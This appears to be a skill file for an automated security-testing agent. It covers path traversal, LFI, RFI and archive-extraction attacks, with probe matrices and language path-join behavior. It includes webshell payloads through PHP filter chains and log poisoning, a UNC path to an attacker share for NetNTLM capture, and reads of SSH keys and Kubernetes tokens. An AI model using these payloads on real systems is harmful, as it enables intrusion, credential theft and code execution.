---
name: path-traversal-lfi-rfi
description: Path traversal, LFI, and RFI — measured containment across path-join stacks, PHP filter-chain LFI→RCE, Windows ADS/8.3/UNC, Zip-Slip / archive-extraction, and the resolver-vs-web-boundary write-to-execution model
---

# Path Traversal / LFI / RFI

Improper file path handling and dynamic inclusion enable sensitive file disclosure, config/source leakage, SSRF pivots, and code execution. Treat all user-influenced paths, names, and schemes as untrusted; normalize and bind them to an allowlist or eliminate user control entirely.

The advanced+expert depth (proxy-vs-backend decode order, Java-backend `/..;/` architectural class, Nginx `alias` off-by-slash, Windows-quirk chaining, second-order write-then-include, archive-extraction Zip-Slip variants, write-primitive characterization, blind confirmation) lives in `path_traversal_lfi_rfi_advanced_deep.md`. The 2024–2026 CVE frontier — Tomcat Rewrite Valve, Spring functional-web, Jenkins args4j, WinRAR archive-extraction, and the canonicalization systematization frame — lives in `path_traversal_lfi_rfi_novel_deep.md`. This file is the standard-mode entry point: a hunter loading only this file is effective for the base class.

## Attack Surface

**Path Traversal**
- Read files outside intended roots via `../`, encoding, normalization gaps
- Write or create files outside intended roots, then evaluate framework-controlled resolution paths separately from direct web access

**Local File Inclusion (LFI)**
- Include server-side files into interpreters/templates

**Remote File Inclusion (RFI)**
- Include remote resources (HTTP/FTP/wrappers) for code execution

**Archive Extraction**
- Zip Slip: write outside target directory upon unzip/untar

**Normalization Mismatches**
- Server/proxy differences (nginx alias/root, upstream decoders)
- OS-specific paths: Windows separators, device names, UNC, NT paths, alternate data streams

**Framework Static-File Handlers**
Each ships a canonical "safe" static-file helper whose safety is entirely determined by whether the caller passed the *user input* or a *validated identifier*. When the user string reaches the helper directly, traversal lives in the frame the helper opens:
- Flask `send_from_directory(dir, user)`, `send_file(joined_path)`
- Express `res.sendFile(path.join(base, req.query.f))`, `express.static` with route capture
- Rails `send_file(path)`, `params[:file]` reaching `File.read`
- Spring `Resource` beans with `FileSystemResource` (see `..._novel_deep.md` for the specific CVE-2024-38819 dual-precondition class)
- .NET `PhysicalFileProvider` + `FileStreamResult`, `Controller.File(path)`
- Go `http.ServeFile(w, r, filepath.Join(base, user))` and framework `c.File(...)` wrappers
- Tomcat `DefaultServlet` + rewrite valves; nginx `location` + `alias/root`
The framework-specific traversal expressions (Nginx `alias` off-by-slash, Java-backend `/..;/` path-parameter divergence, Tomcat Rewrite Valve regressions) live in `path_traversal_lfi_rfi_advanced_deep.md` and `path_traversal_lfi_rfi_novel_deep.md`.

## High-Value Targets

**Unix**
- `/etc/passwd`, `/etc/hosts`, application `.env`/`config.yaml`
- SSH keys, cloud creds, service configs/logs

**Windows**
- `C:\Windows\win.ini`, IIS/web.config, programdata configs, application logs

**Application**
- Source code templates and server-side includes
- Secrets in env dumps, framework caches

## Reconnaissance

### Surface Map

- HTTP params: `file`, `path`, `template`, `include`, `page`, `view`, `download`, `export`, `report`, `log`, `dir`, `theme`, `lang`
- Upload and conversion pipelines: image/PDF renderers, thumbnailers, office converters
- Archive extract endpoints and background jobs; imports with ZIP/TAR/GZ/7z
- Server-side template rendering (PHP/Smarty/Twig/Blade), email templates, CMS themes/plugins
- Reverse proxies and static file servers (nginx, CDN) in front of app handlers

### Capability Probes

- Path traversal baseline: `../../etc/hosts` and `C:\Windows\win.ini`
- Encodings: `%2e%2e%2f`, `%252e%252e%252f`, `..%2f`, `..%5c`, and Unicode lookalikes only where a documented conversion layer maps them to path syntax
- Normalization tests: `..../`, `..\\`, `././`, trailing dot/double dot segments; repeated decoding
- Absolute path acceptance: `/etc/passwd`, `C:\Windows\System32\drivers\etc\hosts`
- Server mismatch: `/static/..;/../etc/passwd` ("..;"), encoded slashes (`%2F`), double-decoding via upstream

### URL Layer Chain Fingerprinting

Before choosing traversal encodings, identify the composition of the request path — which reverse-proxy or CDN is in front, and which application framework handles the request downstream. Each layer decides what encodings survive to reach the file-open call, and mismatching your probe to the actual composition wastes requests and creates false negatives.

**CDN/WAF layer fingerprints:**
- `Server: cloudflare`, `CF-RAY`, `CF-Cache-Status` headers → Cloudflare.
- `X-Amz-Cf-Id`, `X-Amz-Cf-Pop` → CloudFront.
- `X-Cache: Hit from cloudfront` variants → CloudFront.
- `X-Akamai-Transformed`, `X-Akamai-*` → Akamai.
- `Server: AkamaiGHost` → Akamai edge.
- `X-Fastly-*` → Fastly.
- `X-Sucuri-ID`, `X-Sucuri-Cache` → Sucuri.
- `X-CDN`, `X-CDN-Provider` (some CDNs) — check the value.

**Reverse-proxy fingerprints:**
- `Server: nginx/X.Y.Z` → Nginx (version leak on default configs).
- `Server: Apache/X.Y.Z` → Apache httpd.
- `Server: Microsoft-IIS/X.Y` → IIS.
- `Server: envoy` → Envoy proxy.
- `Server: haproxy` (rare — HAProxy usually forwards backend headers).
- `X-Powered-By: PHP/X.Y.Z` — backend is PHP.
- `X-Powered-By: Express` — Node/Express backend.
- `X-Runtime: X.YYY` — Ruby on Rails backend (typically).
- `X-AspNet-Version: X.Y.Z.W` — ASP.NET backend.

**Framework backend fingerprints (via error pages and default responses):**
- `Whitelabel Error Page` HTML → Spring Boot.
- `Django administration` login form → Django admin.
- `Flask` traceback with `werkzeug` → Flask.
- `Not Found. Please check the URL.` FastAPI shape → FastAPI/Starlette.
- Rails traceback with `ActionController::RoutingError` → Rails.
- `HTTP Status 404 – Not Found` with Tomcat-shape footer → Tomcat.
- JBoss/WildFly error pages with `WFLYUT` codes → WildFly.

**Fingerprint composition — three-request probe:**
1. `HEAD /` — captures top-level headers (Server, X-Powered-By, CDN identifiers).
2. `GET /nonexistent-<rand>` — captures 404 error page shape, which reveals the layer that produced the 404 (CDN default, proxy default, or backend framework).
3. `GET /?malformed=%00` — captures URL-parser rejection layer.

Three requests reveal the CDN/WAF, the proxy, and the backend framework in most deployments. Choose traversal encodings to match: an Nginx + Tomcat composition needs different probes than a Cloudflare + Envoy + Spring Boot composition, and matching the probe set narrows the confirmation-oracle window.

## Detection Channels

### Direct

- Response body discloses file content (text, binary, base64)
- Error pages echo real paths

### Error-Based

- Exception messages expose canonicalized paths or `include()` warnings with real filesystem locations

### OAST

- For RFI or URL-capable resource loaders, a correlated callback confirms server-side resolution/fetch. It does not by itself prove inclusion or execution; use a separate response or side-effect oracle for that claim.
- A resolver-only callback (DNS hit, no HTTP fetch) proves *name resolution* — some libraries resolve the hostname during URL parsing well before any fetch decision — so a DNS-only callback is weaker evidence than a full HTTP hit and does not by itself distinguish "server accepted the URL" from "server actually fetched it."

### Side Effects

- Archive extraction writes files unexpectedly outside target
- Verify with directory listings or follow-up reads

### Confirmation Discipline

The finding is *read outside the intended root*, not "the payload was accepted." Anchor every claim to a concrete oracle:

- **In-root control** on the same endpoint (a legitimate filename that also returns 200) proves the endpoint reads files at all; then contrast a canonical out-of-root read (`/etc/hosts`, `C:\Windows\win.ini`) with byte-identical shape to the control (same status, same content-type, different content).
- **Content-length or ETag divergence** where the body is masked (a template that says "file not found" but with a different `Content-Length` on the traversal path) is a partial signal, not confirmation — it says *something differs* about resolution, not that the file was read.
- **Error-shape delta** — a stack trace naming a real filesystem path is a leak (log it) but not proof of read; a trace naming `.../etc/passwd` but no file bytes is a resolver call, not disclosure.
- **OAST-only for RFI** is only confirmation of fetch, not of interpretation. `include()` vs `file_get_contents()` is the difference between RCE and disclosure; you must prove the sink evaluates before claiming code execution.

## Key Vulnerabilities

### Path Traversal Bypasses

**Encodings**
- Single/double URL-encoding, mixed case, UTF-16 or Unicode conversion only when present in the stack, and path normalization oddities

**Mixed Separators**
- `/` and `\\` on Windows; `//` and `\\\\` collapse differences across frameworks

**Dot Tricks**
- `....//` (double dot folding), trailing dots (Windows), trailing slashes, appended valid extension

**Absolute Path Injection**
- Bypass joins by supplying a rooted path

**Alias/Root Mismatch**
- nginx alias without trailing slash with nested location allows `../` to escape
- Try `/static/../etc/passwd` and ";" variants (`..;`)

**Upstream vs Backend Decoding**
- Proxies/CDNs decoding `%2f` differently; test double-decoding and encoded dots

### Language Path-Canonicalization Differentials

The single most common path-traversal root cause: the app *normalizes* the
joined path but never *contains* it to the base — and normalization collapses
`../` right past the base. Measured behavior of `join('/base/www', <input>)`
(Python 3.14, Node 24, Go 1.26, PHP 8.4 run locally; Java from the documented
`Path` contract):

| Stack | `../../etc/passwd` | absolute arg `/etc/passwd` | contains to base? |
|---|---|---|---|
| Python `os.path.join`+`normpath` | `/etc/passwd` (escapes) | **`/etc/passwd`** — absolute arg *replaces* the base | no |
| Node `path.join` | `/etc/passwd` (escapes) | `/base/www/etc/passwd` (concatenated) | no |
| Node `path.resolve` | `/etc/passwd` | **`/etc/passwd`** — absolute arg replaces | no |
| Go `filepath.Join` | `/etc/passwd` (escapes) | `/base/www/etc/passwd` (concatenated) | no |
| PHP `realpath($base.'/'.$in)` | `/etc/passwd` (resolves `..`+symlinks; escapes) | n/a (`false` if missing) | no |
| Java `Paths.get(base).resolve(in).normalize()` | escapes (lexical `..` removal) | **replaces** — `resolve` with an absolute path returns that path | no |

Two operational takeaways: (1) **none of these contain by themselves** — the
only correct defense is canonicalize *then* verify the result starts with the
base + separator (`realpath` + `str_starts_with($real, $base.'/')`,
`resolve().normalize().startsWith(baseNormalized)`), so a target that lacks
that second check is exploitable regardless of language. (2) On Python
(`os.path.join`), Node (`path.resolve`), and Java (`resolve`), an **absolute
path as the "filename" replaces the base** — `?file=/etc/passwd` escapes with
no `../` at all; on Node `path.join` and Go `filepath.Join` it does not, so
you need the `../` form there. Fingerprint the stack, then pick the escape that
its join function actually permits.

Note the `..%2f` (encoded) forms stay *literal* through every path function
above — the URL-decode must happen upstream, so the decoding layer plus the
path function together decide exploitability (see Upstream vs Backend Decoding).

### Windows-Specific Path Handling

Windows filesystem quirks bypass extension allowlists and canonicalization the
target never accounted for:

- **Alternate Data Streams (`::$DATA`)** — append `::$DATA` to read a file's
  default stream while evading a handler/extension check: `web.config::$DATA`
  and `index.php::$DATA` disclose *source* on IIS because the `::$DATA` form
  isn't mapped to the script handler. `::$INDEX_ALLOCATION` on a filename makes
  it resolve as a directory. Also `file.asp::$DATA` to bypass upload/serve
  filters.
- **Trailing dot / space** — Windows strips a trailing `.` or space from
  filenames, so `web.config.`, `web.config ` (or `%20`), and `secret.php.`
  bypass an exact-extension check but open the real file.
- **8.3 short names** — legacy short names (`PROGRA~1`, `WEB~1.CON`) resolve to
  the long name; they bypass allowlists keyed on the full name and enable blind
  enumeration of otherwise-unknown filenames (`~1`, `~2` disambiguators) via
  timing/existence oracles.
- **Reserved device names** — `CON`, `PRN`, `AUX`, `NUL`, `COM1`–`COM9`,
  `LPT1`–`LPT9` are devices at any path depth; requesting them can hang/DoS a
  handler or confuse path logic.
- **Separators and UNC/NT paths** — `/` and `\` are interchangeable; `\\?\`
  disables normalization (long-path/verbatim), and `\\attacker\share\...` (UNC)
  turns a file read into an outbound SMB fetch (NetNTLM capture / SSRF-like
  egress). Mix `..\` with `..%5c` and double-encoding per the decoding layer.

### LFI Wrappers and Techniques

**PHP Wrappers**
- `php://filter/convert.base64-encode/resource=index.php` (read source)
- `zip://archive.zip#file.txt`
- `data://text/plain;base64`
- `expect://` (if enabled)

**Non-PHP Wrappers by Stack**
Every stack ships URL-scheme handlers whose reach extends past `http`/`https` when the fetching code doesn't validate scheme. The relevant handlers per stack, and what each grants when reached from a resource-loader sink:
- **Java** (`URL` / `URLConnection` / `URLClassLoader` / SAX `EntityResolver`): `file:` (local disclosure), `jar:file:///.../inner.jar!/META-INF/MANIFEST.MF` (read a resource inside a jar with no separate unpack), `netdoc:` (deprecated but often still present; equivalent to `file:` on some JVM builds), `ftp:` (SSRF + egress), and — where JNDI is reachable — `ldap:`/`rmi:` (the classic JNDI-injection lookup surface; route to `frameworks/java_spring.md` and `insecure_deserialization.md`). XML parsers with default entity resolution honor the same set (route to `xxe.md`).
- **Python** (`urllib.request.urlopen`, `requests` with `file://` extension packages, `xml.etree` with LXML): `file:` and `ftp:` supported by `urllib` out of the box; `data:` on some builds. Custom stream openers frequently accept `s3://`, `gs://`, `hdfs://` when the relevant client is installed — the resource-loader sink inherits the union of every registered scheme.
- **Ruby** (`URI.open` / legacy `Kernel#open` / `OpenURI`): `Kernel#open` treated a leading `|` as a shell-exec until Ruby 2.6 (still present in older code paths) and honors `file:` + `http:`/`https:` + `ftp:` by default in OpenURI; a URL-typed input reaching `Kernel#open` in older Ruby is command injection, not traversal — the "file" was actually a pipe.
- **Node.js** (`fs.readFile` accepts a `file://` URL, `URL` constructor, `undici`/`node-fetch` with custom protocol handlers): `file://` reads via `fs.readFile(new URL(user))`; `undici` supports `pluggable dispatchers` so a package that registers an internal-network dispatcher is a scheme surface. Node's `fs` does not natively fetch `http://` — that requires `fetch()` or a library — so a Node "file loader" that accepts `http://` is a distinct RFI surface, not an LFI-with-file-scheme.
- **.NET** (`HttpClient`, `WebRequest`, `XmlUrlResolver`): `file:` supported by `WebRequest`/`XmlUrlResolver` by default; the sanctioned replacement is scheme-allowlisting on `HttpClientHandler` — its absence in a resource-loader path is the finding.
- **Go** (`http.Get`, `net/url.Parse`): stdlib is scheme-strict for `http`/`https`; `file://` requires an explicit filesystem transport (`http.NewFileTransport`) — its presence in a resource fetcher is the smell to grep for.

The scheme catalog and its interaction with parsers (XXE `file://`, `jar:` unpack, `expect://` exec) surface in `xxe.md` (XML parsers) and `ssrf.md` (URL-fetcher parser differentials); the traversal-specific expressions of these stay in this file.

### Fingerprinting the Read Constraint

Once a read primitive is confirmed, characterize what it lets you read and how before scaling extraction. The relevant axes:

- **Size limit** — response truncation, chunk-transfer streaming, or fixed-length reads. A 32 KB truncated read of `/etc/passwd` looks like success while a 10 MB `access.log` read silently returns empty. Test with a known-large file (`/proc/kcore` on Linux — never actually read, but a `stat` proxy) or a chosen-length payload.
- **Binary handling** — does the response echo raw bytes, base64-encode, hex, or drop non-printable? Testing with a mixed-binary file (`/bin/ls` — first 4 bytes are `ELF`) reveals the encoding path.
- **Path constraints beyond traversal** — allowlisted extensions checked after normalization (append `%00` on ancient stacks, or a `.jpg` suffix on filters that use extension only), absolute-vs-relative acceptance (some sinks reject `/etc/...` outright), symlink-follow policy, chroot / user-namespace containment.
- **Running-as identity** — a read primitive that returns `/etc/shadow` implies root; one that returns the app user's `~/.ssh/id_rsa` but *not* root-owned files implies a non-root service account. Read `/proc/self/status` (`Uid:` and `Gid:` fields) to establish the identity before any escalation claim.
- **Filesystem visibility** — inside a container, `/proc/1/cgroup` distinguishes host from container; `/proc/self/mountinfo` reveals what's mounted; `/var/run/secrets/kubernetes.io/serviceaccount/token` reveals whether a Kubernetes service-account token is present. These reads scope the impact chain.

A minimum characterization block: identity (`/proc/self/status`), containment (`/proc/1/cgroup`), reach (`/root/.ssh/authorized_keys` vs `/home/*/.ssh/id_*` vs process env), and a size-limit probe. That fixes the impact ceiling before you spend requests on secondary reads.



**PHP filter chains (LFI → RCE without an upload).** A technique class (not a
CVE) from Synacktiv: `php://filter` supports chaining `convert.iconv.*`
character-set conversions, and by stacking conversions whose byte-level
side-effects are known, you can make the filter *emit arbitrary bytes* from any
`resource=` (even an empty/known one). When the LFI sink passes the wrapper
output to an `include`/`require`/`eval`-class context, you prepend a chosen PHP
payload and reach RCE — no writable directory, no log poisoning, no upload. It
works against `include($_GET['file'])`-style sinks that accept the `php://`
scheme and evaluate the result; it does **not** help a pure `file_get_contents`
read sink (that only discloses). Generate the chain for a target payload:
```bash
# https://github.com/synacktiv/php_filter_chain_generator
python3 php_filter_chain_generator.py --chain '<?php system($_GET["c"]); ?>'
# emits a long php://filter/convert.iconv.<A>.<B>|...|convert.base64-decode/resource=php://temp
# feed it to the vulnerable parameter, then hit ?c=id
curl 'https://target/?file=php://filter/convert.iconv.UTF8.CSISO2022KR|...|resource=php://temp&c=id'
```
Confirm the sink `include`s (evaluates) rather than merely reads before
claiming RCE — that distinction is the difference between disclosure and code
execution.

**Log/Session Poisoning to Execution**
When the include sink accepts `../` but wrappers (`php://`, `data://`) are disabled, poison a file the app writes and then include the poisoned file. The classic paths, in decreasing order of reliability:

- **Access log** — `curl -H 'User-Agent: <?php system($_GET["c"]);?>' https://target/`; the log entry contains the payload verbatim (Apache/Nginx write UA into `access.log` under the default `combined` format). Then `?file=../../../var/log/apache2/access.log&c=id`. Log-path fingerprints per stack: `/var/log/apache2/access.log`, `/var/log/nginx/access.log`, `/var/log/httpd/access_log`, `/usr/local/apache2/logs/access_log`. Rotation risk: on a busy server, `access.log` gets huge (megabytes/day) and the `include` may hit a resource limit; try `error_log` (`?a[]=<?php...?>` reliably lands in `error_log` via a warning) or a smaller log.
- **Session file** — set a session cookie, put PHP source in a session-stored value the app writes (`$_SESSION['name'] = $_POST['name']`), then `?file=../../../var/lib/php/sessions/sess_<sid>&c=id`. Requires `session.serialize_handler=php` (default; the payload lands as `name|s:LEN:"<?php...?>";`).
- **`/proc/self/environ`** — request with a payload in a header the app forwards to a CGI child; on the child, `include('/proc/self/environ')` reads the payload back and executes. Requires FastCGI or CGI (not modern php-fpm which does not populate environ this way — verify per host).
- **`/proc/self/fd/N`** — open file descriptors; sometimes reveals log/socket paths without knowing them a priori.
- **Uploaded file at temp name** — POST a file with a PHP payload as filename+content; race between upload completion and cleanup to `include('/tmp/php<random>')` (short window; the `phpinfo()`-leak-and-race technique is the classic depth — advanced sibling).
- **Framework caches** — Rails/Django/PHP OPcache paths that hold compiled templates; if you can write to a template-cache dir the framework loads it back on the next request.

Path fingerprinting for a target: run `?file=../../../../../../etc/os-release` (small canonical file) to establish `../` count; the same offset then reaches log paths per the OS/stack.

**Upload Temp Names**
- Include temporary upload files before relocation; race with scanners

**Proc and Caches**
- `/proc/self/environ`, `/proc/self/cmdline`, `/proc/self/status`, `/proc/self/mountinfo`, `/proc/self/cgroup`, `/proc/<pid>/environ`, and framework-specific caches for readable secrets
- Container-native: `/var/run/secrets/kubernetes.io/serviceaccount/{token,ca.crt,namespace}` when the target runs inside Kubernetes; token grants API access under the pod's service account
- CI/CD pipelines: `/proc/self/environ` on a build container leaks the pipeline's injected secrets (registry creds, deploy tokens)

**Legacy Tricks**
- Null-byte (`%00`) truncation in older stacks; path length truncation

### Template Engines

- PHP include/require; Smarty/Twig/Blade with dynamic template names
- Java/JSP/FreeMarker/Velocity; Node.js ejs/handlebars/pug engines
- Seek dynamic template resolution from user input (theme/lang/template)

### RFI Conditions

**Requirements**
- Remote includes (`allow_url_include`/`allow_url_fopen` in PHP)
- Custom fetchers that eval/execute retrieved content
- SSRF-to-exec bridges

**Protocol Handlers**
- http, https, ftp; language-specific stream handlers

**Exploitation**
- Host a minimal payload that proves code execution
- Prefer OAST beacons or deterministic output over heavy shells
- Chain with upload or log poisoning when remote includes are disabled

### Archive Extraction (Zip Slip)

- Files within archives containing `../` or absolute paths escape target extract directory
- Test multiple formats: zip/tar/tgz/7z
- Verify symlink handling and path canonicalization prior to write
- Impact: overwrite config/templates or drop webshells into served directories

### File Write to Execution

Characterize the write primitive before choosing a payload:

- create vs overwrite vs append; atomic replace vs streamed write
- absolute vs relative path; controllable directory, filename, extension, and bytes
- text encoding, newline conversion, templating, compression, or report generation applied before write
- target process permissions and whether symlinks are followed
- immediate load, hot reload, cache invalidation, restart, scheduled task, or user action required

Then inventory generic execution and influence surfaces:

- view/template search paths and implicit rendering
- module, controller, plugin, package, or class autoload directories
- application bootstrap files and language package initializers
- server/user configuration that changes handler or interpreter behavior
- job definitions, hooks, startup scripts, cron/task inputs, and CI workspace files
- logs, sessions, caches, generated sources, and compiled-template directories later included or evaluated

Do not require the malicious file to be directly web-accessible. An HTTP extension allowlist can block `/path/payload.ext` while an internal view engine, autoloader, or interpreter still opens and executes that file through a clean route. Trace public request filtering and internal file resolution as separate security boundaries.

Test search order with candidate marker files or filesystem traces. Trigger the normal route/action that causes internal resolution. Record whether the framework creates, compiles, caches, or executes the artifact and what reload condition is required.

### Second-Order Traversal

A stored filename or path fragment that the app accepts today and re-uses tomorrow as the *input* to a file operation is a first-class traversal surface even when today's write is contained. The write endpoint sanitizes to an allowlist ("basename only"); the read/render/import endpoint takes the stored value as authoritative and joins it as-is against a different base. Test-payload shape: a filename that the write endpoint accepts unmodified (short, plausible, extension-preserving) whose bytes are the traversal — `image.jpg%00../../../etc/passwd` where the write layer strips the tail but a downstream reader honors it, or a plain `../` sequence when the write validates by extension only. The advanced sibling owns the write-then-include chain end-to-end; the base note is: *inventory every filename field, every path fragment, every "template name" the app writes back to itself* — those are the second-order sources.

## Chaining

Path traversal, LFI, and RFI are almost never terminal — they are pivot primitives. Model the class as three nodes with typed preconditions and postconditions and route each hop by filename.

**Upstream — what grants the primitive.**
- **Authenticated file-serving endpoint** — `authentication_jwt` or a session bug produces the auth needed to reach a per-tenant download/export handler.
- **Server-side URL fetch** — `ssrf` grants the "server fetches attacker-influenced URL" precondition; when the sink evaluates the response, that is RFI even if `allow_url_include=Off` — the app is doing the fetch itself and passing the bytes into `include`/`eval`.
- **Upload primitive** — `file_upload` (framework-specific) or an archive-import endpoint delivers a writable path; the write is the enabling capability for the write-to-exec chain and for the second-order traversal surface above.
- **SSTI / parser mishandling** — `ssti` in a template name field turns render-side template resolution into an attacker-directed include; the traversal shape is `template = '../../etc/passwd'` from an SSTI-controllable field.
- **XXE with `file://` reach** — `xxe` grants arbitrary file-read via the XML parser without ever hitting the path-join layer; that is *disclosure*-tier traversal via a different sink, not path traversal, but the target file catalog is identical.

**Downstream — what this primitive grants.**
- **Disclosure → credential compromise** — `.env`, `application.properties`, `~/.aws/credentials`, `/etc/shadow` (root-runtime), SSH private keys, `kubeconfig`, Django `SECRET_KEY` in `settings.py` (route to `frameworks/django.md` for signed-cookie forge with that key), Rails `secret_key_base`.
- **Disclosure → source read** — read the app's own source to discover further sinks; `php://filter/convert.base64-encode/resource=index.php` is the canonical PHP read; on Java stacks `WEB-INF/classes/*.class` + a disassembler; on Node `dist/*.js` or unpacked bundles.
- **LFI-with-evaluation → RCE** — `include($_GET['file'])` + `php://filter` chain (Synacktiv generator, this file), reaching arbitrary PHP execution; on Java, the closest analogue is JSP compilation of an attacker-written file inside a scanned webapp path (see `path_traversal_lfi_rfi_novel_deep.md` for CVE-2025-55752, the current concrete Tomcat expression).
- **Archive-extraction write → RCE via resolver** — Zip-Slip drops a file into a template/plugin/theme search path; the framework loads it on the next request; capability handed to `file_upload` or a framework-specific loader.
- **Write-to-exec via config poisoning** — overwrite a config file the app re-reads (e.g., `settings.py`, `application.yml`, an nginx include) to change auth, redirect, or module-load behavior.
- **SSRF pivot** — when the read primitive accepts `http://` (or a wrapper does), you have SSRF for free; route into `ssrf.md` for internal-target catalogue and the parser-differential class.

**Composite chains — end-to-end paths, each hop routed.**
1. **Web LFI → app source → SQLi → RCE** — `include($_GET['file']=php://filter/convert.base64-encode/resource=config.php)` returns base64 of the DB creds; direct DB connect gives you SQLi (route to `sql_injection.md`); on Postgres, `COPY ... TO PROGRAM` or `pg_read_server_files` extends to RCE.
2. **Upload → traversal → dropped-webshell** — upload allows any extension into a per-user directory but the archive-import handler unzips into the served webroot without normalization; `../../public/shell.php` inside the archive lands directly under the served path (Zip-Slip). Route the write primitive to `file_upload`; the extraction traversal is the local finding.
3. **Traversal → SSH key → lateral** — read `/root/.ssh/id_rsa` (if the app runs as root) or the app user's key; pivot into internal SSH; the traversal grants the credential, `ssh` is the next-hop tool, no further vuln class needed.
4. **Traversal → cloud metadata credentials** — the trap: SSRF-shaped fetches to `169.254.169.254` are not path traversal; but reading `/proc/self/environ` on a container gives you the mounted service-account token path (e.g. `/var/run/secrets/kubernetes.io/serviceaccount/token`) — that is a direct path read, and the token grants Kubernetes API access. Route follow-on to `cloud/`-tier skills.
5. **Second-order traversal → template poisoning → SSTI** — the app stores a user-supplied template name, then renders the file at that path. The write layer allowlists file extensions but the render layer joins the stored value against `views/` and follows the traversal into an attacker-written template — bug is the second-order use, exploit is the SSTI post-condition (route to `ssti.md`).

Chaining here is reachability/enablement — a granted capability, not a severity multiplier.

## Frontier CVE Routes

Base names + one-line class shape; the version tables and mechanism decomposition live in the novel sibling (§2 CVE single-ownership).

- **Apache Tomcat Rewrite Valve — CVE-2025-55752** — normalize-before-decode regression of bug-60013's fix; encoded `%2e%2e/` bypasses `/WEB-INF/` and `/META-INF/` constraints. RCE-chainable when HTTP `PUT` is enabled on the same context. Dissection + full version table (spanning 8.5.x through 11.0.x, with the EOL 10.0.x branch) in `path_traversal_lfi_rfi_novel_deep.md § Apache Tomcat Rewrite Valve — CVE-2025-55752`.
- **Spring Framework functional web — CVE-2024-38819** — path traversal in `WebMvc.fn` / `WebFlux.fn` when RouterFunctions serves static resources AND the resource location is a `FileSystemResource`. The dual-precondition AND gate is the methodology finding — miss either and the finding is a false positive. Version table (OSS `6.1.14` is the general fix; older-line backports are Enterprise Support only) in `path_traversal_lfi_rfi_novel_deep.md § Spring Framework WebMvc.fn / WebFlux.fn — CVE-2024-38819`.
- **Jenkins CLI args4j expandAtFiles — CVE-2024-23897** — the `@`-prefixed CLI argument expands to file contents; args4j enables this by default and Jenkins did not disable it pre-fix. Read primitive is auth-state-dependent (full file with `Overall/Read`; a few lines without). Version table + read-primitive shape in `path_traversal_lfi_rfi_novel_deep.md § Jenkins args4j expandAtFiles — CVE-2024-23897`.
- **WinRAR archive path traversal — CVE-2025-6218** — archive-embedded paths with `..` escape the extraction root, dropping arbitrary files into arbitrary locations. Framed as the **archive-extraction / Zip-Slip class expression in web upload handlers** (any server-side unarchive that reuses WinRAR-family logic, or that has the same defect independently); the ITW exploitation vector was user-triggered extraction, so distinguish that exposure profile from zero-click server-side unpack. CISA-KEV live under active enforcement. Version boundary + web-upload framing in `path_traversal_lfi_rfi_novel_deep.md § Archive Path Traversal — WinRAR CVE-2025-6218 and the Zip-Slip Web-Upload Class`.

## Sink Fingerprinting

Before firing traversal at a candidate, classify the sink — every downstream decision (choice of probe, choice of confirmation oracle, choice of impact chain) is determined by what the code does with the resolved bytes.

**Read sinks** — the code opens the file and returns/streams its bytes to the response. Impact ceiling is *disclosure*: source, config, secrets, filesystem enumeration. Confirmation is content-level (canonical file bytes in the response, or content-length divergence between control and traversal). Examples: `readfile`, `file_get_contents`, `send_file`, `File.read`, `os.read`, `http.ServeFile`, `res.sendFile`. The PHP filter-chain LFI→RCE class does **not** apply here — a read sink cannot execute the wrapper output.

**Evaluate sinks** — the code passes the bytes into an interpreter or template engine. Impact ceiling is *code execution*. Confirmation is behavior-level (an injected payload runs). Examples: `include`/`require`/`eval`/`require_once` (PHP), `render(template: user)` (template engines), `Function.new(source)` / `instance_eval` (Ruby), `exec(compile(...))` (Python — rare), `runScriptInContext` (Node vm module). PHP filter-chain LFI→RCE lives here; the whole class of "second-order execution via written file then included" also lives here.

**Import / require sinks** — dynamic module/plugin/theme resolution that loads and *initializes* the target. Impact ceiling is code execution; confirmation is a canary side effect fired on module load. Examples: Python `importlib.import_module(user)`, Node `require(user)`, PHP autoloaders, Rails `constantize`, `.NET Type.GetType(user)`. These sinks usually enforce a base path but not always a *filesystem* one — an attacker-written file inside a search path is enough.

**Write sinks** — the code creates or overwrites a file at a path derived from user input. Impact ceiling depends entirely on where the write lands: dropping a file inside a template/plugin/import/theme/log directory chains to an evaluate/import sink on the next request. Confirmation is a canary marker file created at a predicted absolute path, then read back through an in-app oracle (a directory listing, a log entry naming the file, a follow-up read that discovers the marker). Examples: `file_put_contents`, `move_uploaded_file`, `fs.writeFileSync`, `File.write`, archive-extraction unpackers.

**Copy / transform sinks** — image converters, PDF renderers, format transcoders, XSLT engines. Input is a path (or URL); output is a derived file. The transformation is the trap: an `Imagick` pipeline may honor MSL or SVG scripting; an XSLT processor honors `document()` to read arbitrary files; a document converter may follow OOXML relationships to a file:// target. Route these to `xxe.md` (XML transforms), `ssrf.md` (URL-scheme fetches), and the language-specific renderer skill.

**Fetch-and-inline (RFI) sinks** — the code fetches a URL and inlines the response into an evaluated context. The URL scheme becomes the injection: `http://` reaches arbitrary origins; `file://` reaches local files (SSRF-like); language-specific wrappers (`php://`, `jar:`, `netdoc:`, `zip:`) reach in-process resources or archives.

Once the sink is classified, choose the probe that produces the strongest oracle at the lowest noise cost — a `/etc/hosts` read on a read sink, a canary-marker include on an evaluate sink, a marker file on a write sink, an OAST-only URL on a fetch sink.

## Decoding-Layer Order

The single most common false negative in path traversal is a payload that would fire against the backend joined path but never reaches it because an upstream decodes (or normalizes) it first, and the backend's own URL parser normalizes again before the join. `%2e%2e/` on the wire can arrive at the file-open call as `../` (double-decoded), `..%2f` (single-decoded once), a literal `%2e%2e/` (never decoded on the path segment), or a `400 Bad Request` (rejected as an unsafe segment). Which one depends on the ordered composition (reverse proxy → app server → framework router → application code) — every layer is a decoder or a normalizer or both, and the order of decode-vs-normalize determines whether `%2e%2e/` collapses to nothing (`normpath` then `decode` = `<empty>`), lands as `../` (decode then no normalize), or is rejected (`decode` + strict segment validator).

For a fingerprintable target, run the probe matrix (`../`, `%2e%2e/`, `%252e%252e/`, `%25%32%65%25%32%65/`, `..%2f`, `..%252f`, `%2f..%2f`, `..;/`) *paired* with a known-in-root filename and record the response shape per variant. If exactly one variant returns the in-root file with a shape that matches an out-of-root probe using the *same* encoding, the layer chain is exploitable through that variant. The full cross-decoder decode-vs-normalize measured matrix (proxy × backend × payload) lives in `path_traversal_lfi_rfi_advanced_deep.md § Cross-Decoder Decode-vs-Normalize Order`.

## Testing Methodology

1. **Inventory file operations** - Downloads, previews, templates, logs, exports/imports, report engines, uploads, archive extractors
2. **Identify input joins** - Path joins (base + user), include/require/template loads, resource fetchers, archive extract destinations
3. **Probe normalization** - Separators, encodings, double-decodes, case, trailing dots/slashes
4. **Compare behaviors** - Web server vs application behavior
